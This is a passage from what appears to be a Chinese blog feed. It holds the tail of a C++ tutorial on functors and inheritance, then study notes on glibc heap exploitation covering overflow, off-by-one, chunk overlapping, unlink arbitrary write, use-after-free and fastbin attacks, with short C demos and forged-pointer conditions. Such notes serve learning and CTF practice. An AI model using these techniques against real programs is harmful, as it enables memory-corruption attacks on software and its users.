class="hljs-string">&quot;p1与p2不相等&quot;</span>&lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure><p>其他符号都与上面这个类似，只要改几个符号即可，这里只写了<code>==</code></p><h3 id="函数调用运算符的重载"><a href="#函数调用运算符的重载" class="headerlink" title="函数调用运算符的重载"></a>函数调用运算符的重载</h3><ul><li>函数运算符()也可以重载</li><li>重载后使用方式和函数非常像，因此称为仿函数</li><li>仿函数没有固定写法，非常灵活</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">mprint</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">//重载函数调用运算符</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">operator</span><span class="hljs-params">()</span><span class="hljs-params">(string test)</span></span><br><span class="hljs-function">    </span>&#123;<br>        cout &lt;&lt; test &lt;&lt; endl;<br>    &#125;<br>&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">madd</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">operator</span><span class="hljs-params">()</span><span class="hljs-params">(<span class="hljs-type">int</span> n1, <span class="hljs-type">int</span> n2)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> n1 + n2;<br>    &#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    mprint mp;<br>    <span class="hljs-built_in">mp</span>(<span class="hljs-string">&quot;Hello World!&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test02</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    madd md;<br>    cout &lt;&lt; <span class="hljs-built_in">md</span>(<span class="hljs-number">100</span>, <span class="hljs-number">10</span>) &lt;&lt; endl;<br>    <span class="hljs-comment">//匿名函数对象（执行完立即被释放）</span><br>    cout &lt;&lt; <span class="hljs-built_in">madd</span>()(<span class="hljs-number">100</span>, <span class="hljs-number">20</span>) &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">test01</span>();<br>    <span class="hljs-built_in">test02</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p><strong>面向对象的三大特性之一</strong></p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/1744274250663.png" alt="继承"></p><p>我们发现在定义这些类时，下级别除了拥有上一级的共性，还有自己的特性</p><p>这里我们就可以利用继承来减少代码量</p><ul><li><p>语法：<code>class 子类 : 继承方式 父类</code></p></li><li><p>子类也称派生类</p></li><li><p>父类也称基类</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//继承实现</span><br><span class="hljs-comment">//公共页面类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">basepage</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">header</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;登陆          注册&quot;</span> &lt;&lt; endl;<br>    &#125;<br>&#125;;<br><span class="hljs-comment">//Java页面</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Java</span> : <span class="hljs-keyword">public</span> basepage<br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">content</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;Java&quot;</span> &lt;&lt; endl;<br>        cout &lt;&lt; <span class="hljs-string">&quot;-----------------&quot;</span> &lt;&lt; endl;<br>    &#125;<br>&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">python</span> : <span class="hljs-keyword">public</span> basepage<br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">content</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;python&quot;</span> &lt;&lt; endl;<br>        cout &lt;&lt; <span class="hljs-string">&quot;-----------------&quot;</span> &lt;&lt; endl;<br>    &#125;<br>&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">cpp</span> : <span class="hljs-keyword">public</span> basepage<br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">content</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;C++&quot;</span> &lt;&lt; endl;<br>        cout &lt;&lt; <span class="hljs-string">&quot;-----------------&quot;</span> &lt;&lt; endl;<br>    &#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    Java ja;<br>    ja.<span class="hljs-built_in">header</span>();<br>    ja.<span class="hljs-built_in">content</span>();<br>    python py;<br>    py.<span class="hljs-built_in">header</span>();<br>    py.<span class="hljs-built_in">content</span>();<br>    cpp cjj;<br>    cjj.<span class="hljs-built_in">header</span>();<br>    cjj.<span class="hljs-built_in">content</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/1744274955782.png" alt="效果"></p><p><strong>总结：继承减少重复的代码</strong></p>]]></content>
    
    
    <categories>
      
      <category>课内</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>堆的攻击</title>
    <link href="/2025/03/19/%E5%A0%86%E7%9A%84%E6%94%BB%E5%87%BB/"/>
    <url>/2025/03/19/%E5%A0%86%E7%9A%84%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul><li><p>简介：</p><ul><li>程序向堆块写入的字节数超过了堆块本身的字节数（<strong>不是用户申请的字节数</strong>，因为在内部用户申请的字节数会被转换为实际向系统申请的字节数，该数大于等于用户申请的字节数），可以<strong>覆盖到相邻的高地址</strong>的下一个堆块</li></ul></li><li><p>条件：</p><ul><li>向堆上写入数据</li><li>写入的数据大小没被良好的控制</li></ul></li></ul><p>与栈溢出等不同的是我们不可以直接通过堆溢出<strong>直接</strong>控制EIP，我们也就无法直接控制程序执行对应的程序，对于堆溢出：</p><ol><li>覆盖下一个chunk的内容<ul><li>pre_size</li><li>size中的三个bit<ul><li>NON_MAIN_ARENA</li><li>IS_MAPPED</li><li>PREV_INUSE</li><li>the true chunk size</li></ul></li><li>chunk content，改变程序固有执行流</li></ul></li><li>利用堆中unlink来实现任意地址写入或控制堆块的内容等效果来控制程序流</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>寻找堆分配函数<ul><li>通常来说调用malloc来分配，有些时候会使用calloc来分配，区别是<strong>calloc在分配后会自动清空，对于某些信息泄露的漏洞不好</strong></li><li>还有realloc，就是相当于扩充内存块，realloc(ptr,size)<ul><li>size&gt;原来的size<ul><li>chunk与top chunk相邻，直接扩展到目标大小</li><li>不相邻，就分配一个新内存块，并将数据复制过去，原来的那个释放掉</li></ul></li><li>&lt;<ul><li>相差的小于最小的chunk（32为16字节，64为32字节），则保持不变</li><li>大于等于，就切割原来的chunk为两个部分，free掉后面的那个</li></ul></li><li>size&#x3D;0<ul><li>相当于free(ptr)</li></ul></li><li>size&#x3D;ptr的size，不做任何操作</li></ul></li></ul></li><li>寻找危险函数<ul><li>输入<ul><li>gets</li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpt，字符串复制</li><li>strcat，字符串拼接</li><li>brocpy，内存块复制</li></ul></li></ul></li><li>确定填充长度<ul><li>这里需要注意填充的长度<strong>并不是程序申请的长度</strong>，因为程序的长度还会在被转换为内部实际需要申请的长度</li><li>64位中 <strong>in_use_size&#x3D;(用户请求大小 +16(pre_size+size)-8(借了下一个chunk的pre_size)) align to 16B</strong></li></ul></li></ul><h1 id="堆中的Off-By-One"><a href="#堆中的Off-By-One" class="headerlink" title="堆中的Off-By-One"></a>堆中的Off-By-One</h1><p>就是溢出时刚好只多了一个字节，往往与边界验证不严和字符串操作有关，比如</p><ul><li>使用循环时次数设置错误</li><li>字符串操作不合适，比如<code>stelen</code>和<code>strcpt</code>不一致时，<code>strlen</code>不会考虑\x00但<code>strcpy</code>会拷贝</li></ul><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>溢出字节是可控制的人以字节：通过修改大小造成块之间出现重叠-&gt;泄露数据，或是覆盖数据</li><li>溢出字节是NULL字节：在size&#x3D;0x100时，溢出NULL字节可以让<code>prev_in_use</code>被清理，这样前面的那个块就会被认为是free的，这时<ul><li>可以使用<code>unlink</code>处理</li><li>这是<code>pre_size</code>就会启用，可以伪造它来造成块之间的重叠，这个方法的关键在于unlink没有检查按照<code>pre_size</code>找到的块与<code>pre_size</code>是否一致</li></ul></li></ol><p>在新版本中加入了对方法二的check</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* consolidate backward */</span><br>    <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>      prevsize = prev_size (p);<br>      size += prevsize;<br>      p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<br>      <span class="hljs-comment">/* 后两行代码在最新版本中加入，则 2 的第二种方法无法使用，但是 2.28 及之前都没有问题 */</span><br>      <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))<br>        malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);<br>      unlink_chunk (av, p);<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="Chunk-Extend-and-Overlapping"><a href="#Chunk-Extend-and-Overlapping" class="headerlink" title="Chunk Extend and Overlapping"></a>Chunk Extend and Overlapping</h1><h2 id="名词解释："><a href="#名词解释：" class="headerlink" title="名词解释："></a>名词解释：</h2><ul><li><code>Chunk Extend</code>:通过修改堆块大小，扩展其范围以覆盖相邻内存</li><li><code>Overlapping</code>:使多个堆块内存区域重叠，通过一个堆块修改另一个堆块的内容</li></ul><h2 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h2><ul><li>程序存在堆漏洞</li><li>漏洞可以控制<code>chunk header</code>（就是<code>size</code>那些数据)中的数据</li></ul><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理:"></a>原理:</h2><ul><li>该攻击方式能够实现的原因在于<code>ptmalloc</code>对堆操作时的各种宏</li><li>简而言之，<code>ptmalloc</code>通过<code>chunk header</code>的数据判断<code>chunk</code>的使用情况和对前后<code>chunk</code>进行定位，<code>chunk extend</code>就是通过控制<code>size</code>和<code>pre_size</code>来实现跨越块的操作从而<code>overlapping</code>的</li></ul><h2 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h2><ul><li><p>对<code>inuse</code>的<code>fastbin</code>进行<code>extend</code></p><ul><li><p>就是通过第一个块的大小来控制第二个块的内容（演示都是在<strong>64</strong>位环境下）</p></li><li><p>通过修改第一个块的<code>size</code>来在<code>free</code>时将两个块变成一个块，这样在第二次<code>malloc</code>时可以获得第二个块内容</p></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> *ptr,*ptr1;<br><br>    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//分配第一个0x10的chunk</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//分配第二个0x10的chunk</span><br><br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x41</span>;<span class="hljs-comment">// 修改第一个块的size域</span><br><br>    <span class="hljs-built_in">free</span>(ptr);<br>    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<span class="hljs-comment">// 实现 extend，控制了第二个块的内容</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>对<code>inuse</code>的<code>smallbin</code>进行<code>extend</code></p><ul><li>与<code>fastbin</code>方法类似，不过<code>small bin free</code>时会被置于<code>unsorted bin</code>，而且释放时如果与<code>top chunk</code>相连，就会和并到<code>top chunk</code>里</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> *ptr,*ptr1;<br><br>    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<span class="hljs-comment">//分配第一个 0x80 的chunk1</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//分配第二个 0x10 的chunk2</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//防止与top chunk合并</span><br><br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">int</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0xb1</span>;<br>    <span class="hljs-built_in">free</span>(ptr);<br>    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>对<code>free</code>的<code>small bin</code>进行<code>extend</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> *ptr,*ptr1;<br><br>    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<span class="hljs-comment">//分配第一个0x80的chunk1</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//分配第二个0x10的chunk2</span><br><br>    <span class="hljs-built_in">free</span>(ptr);<span class="hljs-comment">//首先进行释放，使得chunk1进入unsorted bin</span><br><br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">int</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0xb1</span>;<br>    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);<br>&#125;<span class="hljs-number">67</span>----<br></code></pre></td></tr></table></figure><ul><li>通过<code>extend</code>后向<code>overlapping</code></li><li>通过<code>extend</code>前向<code>overlapping</code></li></ul><h2 id="Chunk-Extend作用"><a href="#Chunk-Extend作用" class="headerlink" title="Chunk Extend作用"></a>Chunk Extend作用</h2><p>这种技术不能直接控制程序的执行流程，但是可以控制<code>chunk</code>的内容，如果<code>chunk</code>内存在字符串指针或函数指针之类的，就可以通过此来信息泄露和控制程序流</p><p>通过<code>extend</code>来<code>overlapping</code>，通过<code>overlapping</code>可以控制<code>chunk</code>中<code>fd/bk</code>指针从而实现<code>fastbin attack</code>等利用</p><h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><p>顾名思义，脱链操作</p><h2 id="unlink原理："><a href="#unlink原理：" class="headerlink" title="unlink原理："></a>unlink原理：</h2><p>对chunk中内容进行布局，接触unlink操作来发成修改指针的目的</p><p>核心</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// P 是要解除链接的空闲堆块</span><br>FD = P-&gt;fd;<br>BK = P-&gt;bk;<br>FD-&gt;bk = BK;  <span class="hljs-comment">// 关键步骤：写入任意地址</span><br>BK-&gt;fd = FD;  <span class="hljs-comment">// 关键步骤：写入任意地址</span><br></code></pre></td></tr></table></figure><p>unlink前：</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%87%BB/1742917802270.png" alt="前"></p><p>unlink后：</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%87%BB/1742917834909.png" alt="后"></p><p>这样就实现了内存块P的脱链</p><h2 id="原始的unlink"><a href="#原始的unlink" class="headerlink" title="原始的unlink"></a>原始的unlink</h2><p>存在有物理空间连续的两个chunk(Q,nextchunk)，Q在使用，Nextchunk释放。那么我们通过溢出等方式将 Nextchunk 的 fd 和 bk 指针修改为指定的值。则当我们 free(Q) 时</p><ul><li>glibc 判断这个块是 small chunk</li><li>判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并</li><li>判断后向合并，发现后一个 chunk 处于空闲状态，需要合并</li><li>继而对 Nextchunk 采取 unlink 操作</li></ul><p>那么在unlink时</p><p>首先是修改堆的数据（下面两句）</p><ul><li>FD&#x3D;P-&gt;fd &#x3D; target addr -12（也就是FD-&gt;bk&#x3D;target addr）</li><li>BK&#x3D;P-&gt;bk &#x3D; expect value（也就是BK&#x3D;expect value）</li></ul><p>然后写入（往target addr写入expect value）</p><ul><li>FD-&gt;bk &#x3D; BK，即 *(target addr-12+12)&#x3D;BK&#x3D;expect value（就是*target_addr&#x3D;expect value）</li><li>BK-&gt;fd &#x3D; FD，即 *(expect value +8) &#x3D; FD &#x3D; target addr-12（<strong>这里回破坏expect value+8的值，需要注意</strong>）</li></ul><p>这样就实现了往target addr写入expect value</p><h2 id="现代的unlink"><a href="#现代的unlink" class="headerlink" title="现代的unlink"></a>现代的unlink</h2><p>（只截取了一小部分）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span><br>    FD = P-&gt;fd;      <br>    BK = P-&gt;bk;      <br>    <span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))      <br>      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  <br>      <span class="hljs-comment">//检查，如果FD-&gt;bk没指向p或BK-&gt;fd没指向p就不会unlink</span><br>    <span class="hljs-keyword">else</span> &#123;      <br>        FD-&gt;bk = BK;      <br>        BK-&gt;fd = FD;<br></code></pre></td></tr></table></figure><p>所以想要伪造fake chunk就必须要满足</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">BK-&gt;fd==p&lt;=&gt;p-&gt;fd+<span class="hljs-number">0x18</span>==p<br>FD-&gt;bk==p&lt;=&gt;p-bk+<span class="hljs-number">0x10</span>==p<br><span class="hljs-comment">//这里0x18和0x10分别是BK中bk、FD中fd距离指针的长度（64位）</span><br></code></pre></td></tr></table></figure><p>所以我们伪造的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">p-&gt;fd=P<span class="hljs-number">-0x18</span><br>p-&gt;bk=p<span class="hljs-number">-0x10</span><br></code></pre></td></tr></table></figure><p>才可以进行unlink</p><h1 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>内存块被释放后，其对应指针<strong>没有被设置成NULL</strong></p><ul><li>没有代码对内存块进行修改，那么这个内存块在<strong>下一次使用时程序很有可能可以正常运转</strong></li><li>有代码对其修改，那么在下一次使用时会出现奇怪的问题</li></ul><p><strong>我们称释放后没有被设置成NULL的指针称为dangling pointer</strong></p><h1 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a>Fastbin Attack</h1><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><ul><li>存在堆溢出，use-after-free等能控制堆中内容的漏洞</li><li>漏洞发生在fastbin的chunk中</li></ul><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ul><li>Fastbin Double Free</li><li>House of Spirit</li><li>Alloc to Stack</li><li>Arbitrary Alloc</li></ul><p>前两种侧重利用<code>free</code>释放掉<strong>真的chunk或伪造的chunk</strong>，然后再次申请chunk进行攻击，后两种侧重故意修改<code>fd</code>指针，直接用<code>malloc</code>申请指定位置的chunk进行攻击</p><h2 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h2><p>fastbin attack 存在的原因在于 fastbin 是使用单链表来维护释放的堆块的，并且由 fastbin 管理的 chunk 即使被释放，其 next_chunk 的 prev_inuse 位也不会被清空。 </p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> *chunk1,*chunk2,*chunk3;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<br>    chunk2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<br>    chunk3=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<br>    <span class="hljs-comment">//进行释放</span><br>    <span class="hljs-built_in">free</span>(chunk1);<br>    <span class="hljs-built_in">free</span>(chunk2);<br>    <span class="hljs-built_in">free</span>(chunk3);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>释放前</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x602000</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000041</span> &lt;=== chunk1<br><span class="hljs-number">0x602010</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602020</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602030</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602040</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000041</span> &lt;=== chunk2<br><span class="hljs-number">0x602050</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602060</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602070</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602080</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000041</span> &lt;=== chunk3<br><span class="hljs-number">0x602090</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x6020a0</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x6020b0</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x6020c0</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000020f41</span> &lt;=== top chunk<br></code></pre></td></tr></table></figure><p>三次<code>free</code>后</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x602000</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000041</span> &lt;=== chunk1<br><span class="hljs-number">0x602010</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602020</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602030</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602040</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000041</span> &lt;=== chunk2<br><span class="hljs-number">0x602050</span>:   <span class="hljs-number">0x0000000000602000</span>  <span class="hljs-number">0x0000000000000000</span><br><span 